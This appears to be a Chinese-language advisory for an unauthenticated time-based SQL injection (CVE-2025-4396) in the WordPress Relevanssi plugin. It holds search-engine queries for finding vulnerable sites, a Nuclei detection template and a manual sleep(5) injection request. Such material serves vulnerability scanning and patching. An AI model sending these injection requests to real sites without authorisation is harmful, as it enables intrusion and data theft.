## WordPress Relevanssi 插件 SQL 注入漏洞（CVE-2025-4396）

## 漏洞描述
Relevanssi – A Better Search 插件在处理 `cats`、`tags` 等查询参数时缺少绑定和转义，导致未认证攻击者可以构造时间盲注语句，从数据库中读取敏感信息。

## 影响版本
- Relevanssi Free ≤ 4.24.4
- Relevanssi Premium ≤ 2.27.4

## 网络空间测绘
```
fofa: body="/wp-content/plugins/relevanssi/"
publicwww: "/wp-content/plugins/relevanssi/"
```

## Nuclei Poc（CVE-2025-4396）
```
id: CVE-2025-4396
info:
  name: Relevanssi <= 4.24.4 (Free) - Unauthenticated SQL Injection
  author: iamnoooob,rootxharsh,pdresearch
  severity: high
  description: >
    The Relevanssi – A Better Search plugin for WordPress is vulnerable to time-based
    SQL Injection via the cats and tags query parameters in all versions up to,
    and including, 4.24.4 (Free) and <= 2.27.4 (Premium).
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/detail/relevanssi-4244-free-and-2274-premium-unauthenticated-sql-injection
    - https://plugins.trac.wordpress.org/browser/relevanssi/tags/4.24.4/lib/search-tax-query.php#L371
    - https://plugins.trac.wordpress.org/browser/relevanssi/tags/4.24.4/lib/search-tax-query.php#L409
    - https://plugins.trac.wordpress.org/browser/relevanssi/tags/4.24.4/lib/search.php#L1016
    - https://plugins.trac.wordpress.org/browser/relevanssi/tags/4.24.4/lib/search.php#L982
  classification:
    cvss-score: 7.5
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
http:
  - raw:
      - |
        @timeout: 30s
        GET /?s={{randstr}}&cats=1*sleep(5) HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - duration>=5
          - contains(content_type, "text/html")
          - contains(body, "relevanssi")
        condition: and
```

## 手工验证示例
```
GET /?s=test&cats=1*sleep(5) HTTP/1.1
Host: target.com
```
响应延迟 ≥5 秒可初步判定漏洞存在。

## 参考
- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-4396.yaml

